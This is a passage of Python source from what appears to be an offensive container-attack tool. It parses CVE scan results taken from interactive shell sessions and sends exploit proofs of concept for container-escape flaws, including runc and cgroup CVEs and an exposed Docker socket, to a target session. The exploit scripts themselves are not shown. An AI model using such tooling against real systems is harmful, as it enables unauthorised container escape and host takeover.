# ── public API ──────────────────────────────────────────────────────────────

def _parse_scan_output(out: str) -> list[dict]:
    """Parse `CVE|id|status|detail` records, tolerating interactive-shell
    prompt noise (e.g. `# # # > > > > CVE|...` from /bin/sh -i sessions)."""
    findings: list[dict] = []
    pat = re.compile(r"CVE\|([^|]+)\|([^|]+)\|((?:(?!CVE\|).)*)")
    for m in pat.finditer(out or ""):
        cve, status, detail = m.group(1), m.group(2), m.group(3).strip()
        detail = re.sub(r"[\s#>]+$", "", detail).strip()
        if not cve or not status:
            continue
        name, severity, description = CVE_CATALOG.get(
            cve, (cve, "info", "No catalog entry")
        )
        findings.append({
            "cve": cve,
            "name": name,
            "severity": severity,
            "description": description,
            "status": status,
            "detail": detail,
        })
    return findings


def scan_cves(session, timeout: float = 45.0, session_id: Optional[str] = None) -> dict:
    """Run the container CVE scan on an active session and parse the results."""
    script = build_scan_script()
    if getattr(session, "session_type", "shell") == "shell":
        script = "PS1=''; PS2=''; PS4='';" + script + "\necho '__CVE_SCAN_DONE__'\n"
    out = session.send(script, timeout=timeout) or ""
    findings = _parse_scan_output(out)
    vuln = sum(1 for f in findings if f["status"] == "vulnerable")
    poss = sum(1 for f in findings if f["status"] == "possibly")
    clean = sum(1 for f in findings if f["status"] == "clean")
    unknown = sum(1 for f in findings if f["status"] == "unknown")
    return {
        "ok": True,
        "session_type": getattr(session, "session_type", "shell"),
        "summary": f"{vuln} vulnerable, {poss} possibly vulnerable, {clean} clean, {unknown} unknown",
        "vulnerable_count": vuln,
        "possibly_count": poss,
        "findings": findings,
    }


def exploit_cve(
    session, cve_id: str, timeout: float = 60.0, session_id: Optional[str] = None
) -> dict:
    """Deliver an exploit PoC for a CVSS-tagged weakness to the target."""
    cve_id = (cve_id or "").strip().upper()
    if cve_id not in _EXPLOITS:
        name = CVE_CATALOG.get(cve_id, (cve_id, "info", ""))[0]
        return {
            "ok": False,
            "cve": cve_id,
            "name": name,
            "note": "No automated exploit is available for this finding. "
                    "Options: CVE-2022-0492, CVE-2024-21626, CVE-2019-5736, "
                    "CTR-PRIV, CTR-DOCKERSOCK, CTR-PIDLEAK.",
            "output": "",
        }
    note, script = _EXPLOITS[cve_id]
    output = session.send(script, timeout=timeout) or ""
    return {
        "ok": True,
        "cve": cve_id,
        "name": CVE_CATALOG[cve_id][0],
        "severity": CVE_CATALOG[cve_id][1],
        "note": note,
        "output": output,
    }


def list_exploitable() -> list[dict]:
    return [
        {"cve": cve, "name": CVE_CATALOG[cve][0], "severity": CVE_CATALOG[cve][1]}
        for cve in EXPLOITABLE
    ]
